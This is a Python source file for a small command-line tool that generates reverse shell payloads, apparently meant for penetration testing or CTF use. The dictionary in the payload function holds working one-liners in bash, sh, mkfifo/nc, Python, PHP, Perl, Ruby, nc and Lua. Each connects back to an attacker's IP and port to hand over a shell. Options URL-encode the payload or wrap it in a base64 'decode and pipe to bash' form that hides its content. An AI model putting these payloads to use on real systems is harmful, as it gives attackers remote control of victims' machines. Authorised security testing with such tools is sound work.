#!/usr/bin/env python
# serioton (@seriotonctf)
#
# small script to generate reverse shell payloads
#
####################

import argparse
from argparse import Action
import urllib.parse
import sys
import base64


class CustomHelpFormatter(argparse.HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=40)


def banner():
    print(
        """
   _____ _          _ _  _____      _   
  / ____| |        | | |/ ____|    | |  
 | (___ | |__   ___| | | |     __ _| |_ 
  \___ \| '_ \ / _ \ | | |    / _` | __|
  ____) | | | |  __/ | | |___| (_| | |_ 
 |_____/|_| |_|\___|_|_|\_____\__,_|\__| by @serioton
                                         version: 1.0.0   
    """
    )


def url_encode(payload):
    return urllib.parse.quote_plus(payload)


def encode_base64(payload):
    encoded_payload = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded_payload} | base64 -d | bash"


def generate_reverse_shell_payload(shell_type, ip, port, encode, base64_encode):
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "sh": f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
        "mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f",
        "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'',
        "php": f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "perl": f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        "ruby": f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        "nc": f"nc -e /bin/sh {ip} {port}",
        "lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('bash -i <&3 >&3 2>&3');\"",
    }

    payload = payloads.get(shell_type)

    if payload is None:
        print("Unsupported shell type")
        return None

    if encode:
        payload = url_encode(payload)

    if base64_encode:
        payload = encode_base64(payload)

    return payload


def main():
    parser = argparse.ArgumentParser(
        description="Generate reverse shell payload",
        formatter_class=CustomHelpFormatter,
    )
    parser.add_argument(
        "shell_type", help="Type of the shell (bash, python, php, nc, ...)"
    )
    parser.add_argument("ip", help="IP address of the attacker")
    parser.add_argument("port", type=int, help="Port to listen on")
    parser.add_argument(
        "-e", "--encode", action="store_true", help="URL encode the payload"
    )
    parser.add_argument(
        "-b", "--base64", action="store_true", help="Base64 encode the payload"
    )
    parser.add_argument(
        "-w", "--write", metavar="FILENAME", help="Write the payload to a file"
    )
    parser.add_argument(
        "-c", "--copy", action="store_true", help="Copy the payload to clipboard"
    )
    args = parser.parse_args()

    payload = generate_reverse_shell_payload(
        args.shell_type, args.ip, args.port, args.encode, args.base64
    )

    if payload is None:
        return

    print(f"[+] Payload: {payload}")

    if hasattr(args, "write") and args.write:
        try:
            with open(args.write, "w") as f:
                f.write(payload)
            print(f"[+] Payload written to {args.write}")
        except Exception as e:
            print(f"Error: Could not write file to {e}")

    if args.copy:
        try:
            import pyperclip

            pyperclip.copy(payload)
            print("[+] Payload copied to clipbaord")
        except ImportError:
            print(
                "[-] Please install the 'pyperclip' module to copy the payload to the clipboard."
            )
            print("[-] You can install it using pip: pip install pyperclip.")


if __name__ == "__main__":
    banner()
    main()
